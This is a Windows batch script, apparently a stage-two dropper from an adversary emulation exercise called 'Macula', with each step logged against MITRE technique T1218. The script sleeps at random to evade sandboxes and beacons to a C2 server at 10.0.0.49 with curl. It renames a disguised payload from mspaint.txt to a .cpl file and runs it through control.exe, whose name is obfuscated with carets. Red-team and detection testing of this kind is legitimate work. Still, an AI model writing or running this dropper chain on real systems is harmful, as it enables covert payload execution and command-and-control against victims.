@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO obfuscation)
SET yktnwwf=%APPDATA%\8937\fbc31ed1
SET fpakbq=Macula-Stage0-8937
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8937-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=mspaint.txt
SET fpldhe=8937

REM Log file path
SET dbjwypg=%APPDATA%\!yydue!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_started=stage2>> "!dbjwypg!" 2>nul

REM Initial delay
timeout /t 15 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete=15s>> "!dbjwypg!" 2>nul

REM C2 heartbeat (MANDATORY - no obfuscation)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start>> "!dbjwypg!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_sent=!rdzgrnne!>> "!dbjwypg!" 2>nul

REM Random delay
SET /A bnxqay=%RANDOM% %% 15 + 5
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start=!bnxqay!s>> "!dbjwypg!" 2>nul
timeout /t !bnxqay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete>> "!dbjwypg!" 2>nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!dbjwypg!" 2>nul
cd /d "!yktnwwf!" 2>nul
if errorlevel 1 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_failed=!errorlevel!>> "!dbjwypg!" 2>nul
    SET jklres=0
    SET mndetl=directory_not_found
    goto logttp
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_success>> "!dbjwypg!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: ping_delay_complete>> "!dbjwypg!" 2>nul

REM Rename DLL to CPL with obfuscated extension
SET cplpart=.c^pl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!edjwtl!>> "!dbjwypg!" 2>nul
ren "!edjwtl!" "file!cplpart!" 2>nul
if errorlevel 1 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_failed=!errorlevel!>> "!dbjwypg!" 2>nul
    SET jklres=0
    SET mndetl=rename_failed
    goto logttp
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_success=file!cplpart!>> "!dbjwypg!" 2>nul

CHOICE /C Y /N /D Y /T 7 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: choice_delay_complete>> "!dbjwypg!" 2>nul

REM Execute control.exe with obfuscated LOLBIN
SET cmd1=c^o
SET cmd2=ntrol^.
SET cmd3=exe
SET lolbin=!cmd1!!cmd2!!cmd3!
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_start=!lolbin!>> "!dbjwypg!" 2>nul
!lolbin! "file!cplpart!" 2>nul

if errorlevel 1 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_failed=!errorlevel!>> "!dbjwypg!" 2>nul
    SET jklres=0
    SET mndetl=control_exe_failed
) else (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_success>> "!dbjwypg!" 2>nul
    SET jklres=1
    SET mndetl=
)

:logttp
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: ttp_logging_start>> "!dbjwypg!" 2>nul
echo [%DATE:~-4%-%DATE:~3,2%-%DATE:~0,2% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!jklres!:!mndetl!>> "!dbjwypg!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_completed>> "!dbjwypg!" 2>nul
ENDLOCAL